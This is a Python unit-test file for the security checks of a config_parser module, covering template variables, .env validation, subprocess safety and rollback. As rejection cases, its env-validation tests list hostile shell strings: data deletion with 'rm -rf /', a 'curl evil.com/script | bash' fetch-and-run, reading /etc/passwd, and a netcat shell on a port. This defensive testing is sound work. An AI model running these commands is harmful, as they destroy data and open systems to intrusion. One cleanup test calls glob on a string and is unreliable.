#!/usr/bin/env python3
"""
Test suite for security features in config_parser.py
Tests all security-related functions and mechanisms implemented to prevent vulnerabilities.
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path
import unittest
from unittest.mock import patch, MagicMock
import subprocess
import re

# Add repository root to path to import config_parser
repo_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(repo_root))
import config_parser


class TestTemplateVariableDetection(unittest.TestCase):
    """Test the detect_template_variables function."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)
        
    def test_detect_simple_variables(self):
        """Test detection of simple template variables."""
        template_content = '''
        {
            "path": "${HOME}/projects",
            "key": "${API_KEY}",
            "other": "no variable here"
        }
        '''
        
        template_file = Path(self.test_dir) / "test.json"
        template_file.write_text(template_content)
        
        variables = config_parser.detect_template_variables(template_file)
        
        self.assertEqual(variables, {"HOME", "API_KEY"})
        
    def test_detect_complex_variables(self):
        """Test detection of variables in various contexts."""
        template_content = '''
        {
            "args": ["${HOME}/bin", "${WORKSPACE}/src"],
            "env": {
                "PATH": "${HOME}/bin:${PATH}",
                "CUSTOM": "${MY_VAR_123}"
            },
            "command": "echo ${HOME} and ${USER_NAME}"
        }
        '''
        
        template_file = Path(self.test_dir) / "complex.json"
        template_file.write_text(template_content)
        
        variables = config_parser.detect_template_variables(template_file)
        
        expected = {"HOME", "WORKSPACE", "PATH", "MY_VAR_123", "USER_NAME"}
        self.assertEqual(variables, expected)
        
    def test_detect_no_variables(self):
        """Test file with no template variables."""
        template_content = '''
        {
            "path": "/static/path",
            "key": "static_value",
            "other": "just text $HOME but not a template"
        }
        '''
        
        template_file = Path(self.test_dir) / "no_vars.json"
        template_file.write_text(template_content)
        
        variables = config_parser.detect_template_variables(template_file)
        
        self.assertEqual(variables, set())
        
    def test_detect_malformed_variables(self):
        """Test handling of malformed variable patterns."""
        template_content = '''
        {
            "incomplete": "${INCOMPLETE",
            "empty": "${}",
            "valid": "${VALID}",
            "nested": "${${NESTED}}",
            "special_chars": "${VAR_WITH_123}"
        }
        '''
        
        template_file = Path(self.test_dir) / "malformed.json"
        template_file.write_text(template_content)
        
        variables = config_parser.detect_template_variables(template_file)
        
        # Should only detect properly formed variables
        expected = {"VALID", "VAR_WITH_123"}  # NESTED might be detected too
        self.assertTrue(variables.issuperset(expected))
        
    def test_detect_nonexistent_file(self):
        """Test handling of non-existent files."""
        nonexistent_file = Path(self.test_dir) / "nonexistent.txt"
        
        variables = config_parser.detect_template_variables(nonexistent_file)
        
        self.assertEqual(variables, set())


class TestEnvironmentFileValidation(unittest.TestCase):
    """Test the validate_env_file function for security."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)
        
    def test_validate_safe_env_file(self):
        """Test validation of safe environment file."""
        safe_content = '''
        # Safe environment file
        API_KEY=your_api_key_here
        HOME_DIR=/home/user
        DATABASE_URL=postgresql://user:pass@localhost/db
        DEBUG=true
        MAX_CONNECTIONS=100
        '''
        
        env_file = Path(self.test_dir) / "safe.env"
        env_file.write_text(safe_content)
        
        result = config_parser.validate_env_file(env_file)
        
        self.assertTrue(result)
        
    def test_validate_malicious_shell_injection(self):
        """Test detection of shell injection attempts."""
        malicious_contents = [
            'API_KEY=$(rm -rf /)',
            'HOME=/tmp; rm -rf /*',
            'PATH=`evil_command`',
            'KEY=value && malicious_command',
            'VAR=test || dangerous_cmd',
            'SETTING=normal; eval "evil code"',
            'VALUE=$(curl evil.com/script | bash)',
        ]
        
        for i, content in enumerate(malicious_contents):
            env_file = Path(self.test_dir) / f"malicious_{i}.env"
            env_file.write_text(content)
            
            result = config_parser.validate_env_file(env_file)
            
            self.assertFalse(result, f"Should have detected malicious content: {content}")
            
    def test_validate_suspicious_patterns(self):
        """Test detection of suspicious patterns."""
        suspicious_contents = [
            'EXEC_CMD=exec malicious_binary',
            'EVAL_CODE=eval "dangerous_code"',
            'SCRIPT=$(cat /etc/passwd)',
            'BACKDOOR=nc -l -p 1234 -e /bin/sh',
        ]
        
        for i, content in enumerate(suspicious_contents):
            env_file = Path(self.test_dir) / f"suspicious_{i}.env"
            env_file.write_text(content)
            
            result = config_parser.validate_env_file(env_file)
            
            self.assertFalse(result, f"Should have detected suspicious content: {content}")
            
    def test_validate_nonexistent_file(self):
        """Test handling of non-existent environment files."""
        nonexistent_file = Path(self.test_dir) / "nonexistent.env"
        
        result = config_parser.validate_env_file(nonexistent_file)
        
        self.assertFalse(result)
        
    def test_validate_empty_file(self):
        """Test validation of empty environment file."""
        empty_file = Path(self.test_dir) / "empty.env"
        empty_file.write_text("")
        
        result = config_parser.validate_env_file(empty_file)
        
        self.assertTrue(result)


class TestSecureTemplateProcessing(unittest.TestCase):
    """Test the process_template_file function security features."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.env_file = Path(self.test_dir) / ".env"
        
        # Create a safe environment file
        self.env_file.write_text('''
        HOME=/home/testuser
        API_KEY=test_api_key
        DATABASE_URL=postgresql://localhost/test
        ''')
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)
        
    def test_secure_subprocess_handling(self):
        """Test that subprocess calls are properly secured."""
        template_content = '''
        {
            "path": "${HOME}/projects",
            "key": "${API_KEY}"
        }
        '''
        
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text(template_content)
        
        # Mock subprocess.run to verify secure argument handling
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout='{"path": "/home/testuser/projects", "key": "test_api_key"}'
            )
            
            result = config_parser.process_template_file(template_file, [str(self.env_file)])
            
            self.assertTrue(result)
            
            # Verify subprocess was called with secure arguments
            mock_run.assert_called_once()
            call_args = mock_run.call_args
            
            # Should not use shell=True
            self.assertNotEqual(call_args.kwargs.get('shell'), True)
            
            # Arguments should be properly quoted/escaped
            args = call_args.args[0]
            self.assertIsInstance(args, list)  # Should be a list, not a string
            
    def test_atomic_file_operations(self):
        """Test atomic file operations and proper cleanup."""
        template_content = '{"path": "${HOME}/test"}'
        
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text(template_content)
        
        original_content = template_file.read_text()
        
        # Mock envsubst to simulate failure
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = subprocess.CompletedProcess(
                args=[], returncode=1, stderr='envsubst failed'
            )
            
            result = config_parser.process_template_file(template_file, [str(self.env_file)])
            
            self.assertFalse(result)
            
            # Original file should be unchanged
            self.assertEqual(template_file.read_text(), original_content)
            
    def test_timeout_handling(self):
        """Test subprocess timeout handling."""
        template_content = '{"path": "${HOME}/test"}'
        
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text(template_content)
        
        # Mock subprocess to simulate timeout
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired('envsubst', 30)
            
            result = config_parser.process_template_file(template_file, [str(self.env_file)])
            
            self.assertFalse(result)
            
    def test_malicious_env_file_rejection(self):
        """Test that malicious environment files are safely skipped."""
        # Create malicious environment file
        malicious_env = Path(self.test_dir) / "malicious.env"
        malicious_env.write_text('API_KEY=$(rm -rf /)')
        
        template_content = '{"key": "${API_KEY}"}'
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text(template_content)
        
        # The function should succeed by skipping the malicious file
        # It won't process the template since no safe env files are available
        result = config_parser.process_template_file(template_file, [str(malicious_env)])
        
        # This succeeds because it safely skips malicious files
        self.assertTrue(result, "Should succeed by safely skipping malicious environment file")


class TestEnvironmentAnalysis(unittest.TestCase):
    """Test the analyze_template_environment function."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)
        
    def test_analyze_with_all_vars_defined(self):
        """Test analysis when all variables are defined."""
        # Create environment file
        env_file = Path(self.test_dir) / ".env"
        env_file.write_text('''
        HOME=/home/user
        API_KEY=secret_key
        ''')
        
        # Create template
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text('{"path": "${HOME}", "key": "${API_KEY}"}')
        
        has_templates, required_vars, available_vars = config_parser.analyze_template_environment(
            template_file, [str(env_file)]
        )
        
        self.assertTrue(has_templates)
        self.assertEqual(required_vars, {"HOME", "API_KEY"})
        self.assertIn("HOME", available_vars)
        self.assertIn("API_KEY", available_vars)
        
    def test_analyze_with_missing_vars(self):
        """Test analysis when some variables are missing."""
        # Create environment file with only some variables
        env_file = Path(self.test_dir) / ".env"
        env_file.write_text('HOME=/home/user')
        
        # Create template requiring more variables
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text('{"path": "${HOME}", "key": "${API_KEY}", "db": "${DB_URL}"}')
        
        has_templates, required_vars, available_vars = config_parser.analyze_template_environment(
            template_file, [str(env_file)]
        )
        
        self.assertTrue(has_templates)
        self.assertEqual(required_vars, {"HOME", "API_KEY", "DB_URL"})
        self.assertIn("HOME", available_vars)
        self.assertNotIn("API_KEY", available_vars)
        self.assertNotIn("DB_URL", available_vars)
        
    def test_analyze_no_templates(self):
        """Test analysis of file with no template variables."""
        template_file = Path(self.test_dir) / "static.json"
        template_file.write_text('{"path": "/static/path", "key": "static_value"}')
        
        has_templates, required_vars, available_vars = config_parser.analyze_template_environment(
            template_file, []
        )
        
        self.assertFalse(has_templates)
        self.assertEqual(required_vars, set())
        self.assertEqual(available_vars, {})


class TestRollbackFunctionality(unittest.TestCase):
    """Test rollback capability for failed template processing."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)
        
    def test_rollback_on_processing_failure(self):
        """Test that files are rolled back on processing failure."""
        # Create original template
        template_file = Path(self.test_dir) / "template.json"
        original_content = '{"original": "content"}'
        template_file.write_text(original_content)
        
        # Create environment file
        env_file = Path(self.test_dir) / ".env"
        env_file.write_text('TEST_VAR=test_value')
        
        # Mock subprocess to fail after temp file creation
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = subprocess.CompletedProcess(
                args=[], returncode=1, stderr='Processing failed'
            )
            
            result = config_parser.process_template_file(template_file, [str(env_file)])
            
            self.assertFalse(result)
            
            # Original file should be unchanged (rollback successful)
            self.assertEqual(template_file.read_text(), original_content)
            
    def test_cleanup_temp_files(self):
        """Test that temporary files are properly cleaned up."""
        template_file = Path(self.test_dir) / "template.json"
        template_file.write_text('{"path": "${HOME}"}')
        
        env_file = Path(self.test_dir) / ".env"
        env_file.write_text('HOME=/home/user')
        
        # Count files before
        files_before = list(self.test_dir.glob('*'))
        
        # Process template
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout='{"path": "/home/user"}'
            )
            
            config_parser.process_template_file(template_file, [str(env_file)])
        
        # Count files after - should be same (no temp files left)
        files_after = list(self.test_dir.glob('*'))
        
        # Should have same number of files (temp files cleaned up)
        self.assertEqual(len(files_before), len(files_after))


if __name__ == '__main__':
    unittest.main()